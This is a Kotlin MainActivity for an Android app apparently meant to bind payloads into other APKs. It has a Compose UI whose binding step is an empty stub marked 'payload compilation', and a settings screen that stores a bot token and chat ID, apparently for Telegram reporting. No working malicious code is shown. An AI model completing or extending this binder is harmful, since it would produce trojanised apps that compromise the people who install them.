package Com.devhs.apkbinder

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Home
import androidx.compose.material.icons.filled.Settings
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.lifecycle.lifecycleScope
import Com.devhs.apkbinder.data.ConfigManager
import Com.devhs.apkbinder.ui.HomeScreen
import Com.devhs.apkbinder.ui.SettingsScreen
import Com.devhs.apkbinder.ui.theme.HsApkBinderTheme
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {
    private lateinit var configManager: ConfigManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        configManager = ConfigManager(applicationContext)

        lifecycleScope.launch {
            val token = configManager.botTokenFlow.first()
            val chatId = configManager.chatIdFlow.first()

            setContent {
                HsApkBinderTheme {
                    var selectedTab by remember { mutableStateOf(0) }
                    var botTokenState by remember { mutableStateOf(token) }
                    var chatIdState by remember { mutableStateOf(chatId) }

                    Scaffold(
                        modifier = Modifier.fillMaxSize(),
                        bottomBar = {
                            NavigationBar(
                                containerColor = MaterialTheme.colorScheme.surface
                            ) {
                                NavigationBarItem(
                                    icon = { Icon(Icons.Default.Home, contentDescription = "Home") },
                                    label = { Text("Home") },
                                    selected = selectedTab == 0,
                                    onClick = { selectedTab = 0 },
                                    colors = NavigationBarItemDefaults.colors(
                                        selectedIconColor = MaterialTheme.colorScheme.primary,
                                        unselectedIconColor = MaterialTheme.colorScheme.onSurfaceVariant
                                    )
                                )
                                NavigationBarItem(
                                    icon = { Icon(Icons.Default.Settings, contentDescription = "Settings") },
                                    label = { Text("Settings") },
                                    selected = selectedTab == 1,
                                    onClick = { selectedTab = 1 },
                                    colors = NavigationBarItemDefaults.colors(
                                        selectedIconColor = MaterialTheme.colorScheme.primary,
                                        unselectedIconColor = MaterialTheme.colorScheme.onSurfaceVariant
                                    )
                                )
                            }
                        }
                    ) { innerPadding ->
                        Surface(
                            modifier = Modifier
                                .fillMaxSize()
                                .padding(innerPadding),
                            color = MaterialTheme.colorScheme.background
                        ) {
                            if (selectedTab == 0) {
                                HomeScreen(
                                    onStartBinding = { apkPath, features, targetActivity ->
                                        // Execute background binding/payload compilation
                                    }
                                )
                            } else {
                                SettingsScreen(
                                    currentBotToken = botTokenState,
                                    currentChatId = chatIdState,
                                    onSaveConfig = { newToken, newChatId ->
                                        botTokenState = newToken
                                        chatIdState = newChatId
                                        lifecycleScope.launch {
                                            configManager.saveConfig(newToken, newChatId)
                                        }
                                    }
                                )
                            }
                        }
                    }
                }
            }
        }
    }
}
